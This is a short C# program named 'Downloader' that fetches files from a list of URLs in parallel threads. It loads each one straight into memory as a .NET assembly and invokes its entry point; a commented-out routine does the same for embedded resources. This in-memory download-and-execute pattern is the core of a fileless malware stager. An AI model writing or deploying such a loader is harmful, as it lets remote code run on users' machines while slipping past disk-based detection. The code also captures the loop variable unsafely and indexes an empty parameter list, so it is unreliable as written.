using System.IO;
using System.Collections.Generic;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Downloader
{
    class Program
    {
        //Put direct urls in this list
        public static List<string> urls = new List<string>(new string[] { ""
 });

        //static void CopyStream(Stream input, Stream output)
        //{
        //    byte[] buffer = new byte[16 * 1024];
        //    int read;
        //    while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
        //    {
        //        output.Write(buffer, 0, read);
        //    }
        //}

        //Runs a resource embedded in the exe
        //static void RunResource(String embeddedFileName)
        //{
        //    Thread t = new Thread(() =>
        //    {
        //        var currentAssembly = Assembly.GetExecutingAssembly();
        //        var arrResources = currentAssembly.GetManifestResourceNames();
        //        foreach (var resourceName in arrResources)
        //        {
        //            if (resourceName.ToUpper().EndsWith(embeddedFileName.ToUpper()))
        //            {
        //                Stream memStream = currentAssembly.GetManifestResourceStream(resourceName);
        //                var ms = new MemoryStream();
        //                CopyStream(memStream, ms);
        //                RunFromAssembly(ms.ToArray());
        //            }
        //        }
        //    });
        //    t.SetApartmentState(ApartmentState.STA);
        //    t.Start();
        //}

        static void RunFromAssembly(byte[] assembly, object[] parameters)
        {
            Assembly a = Assembly.Load(assembly);
            MethodInfo method = a.EntryPoint;
            if (method != null)
            {
                object o = a.CreateInstance(method.Name);
                method.Invoke(o, parameters);
            }
        }

        static void Main(string[] args)
        {
            List<object[]> parameters = new List<object[]>();
            // Here you can add parameters for each process
            // examples:
            // parameters.Add(new object[] { "Param1Proc1", "Param2Proc1" });
            // parameters.Add(new object[] { "Param1Proc2", "Param2Proc2" });

            for (int i=0; i<urls.Count; i++)
            {
                //Downloads files at the same time and runs them after they are finished downloading
                Thread t = new Thread(() =>
                {
                    using (var client = new WebClient())
                    {
                        ServicePointManager.Expect100Continue = true;
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                        var memStream = new MemoryStream(client.DownloadData(urls[i]));
                        RunFromAssembly(memStream.ToArray(), parameters[i]);
                    }

                });
                t.SetApartmentState(ApartmentState.STA);
                t.Start();
            }
        }
    }
}
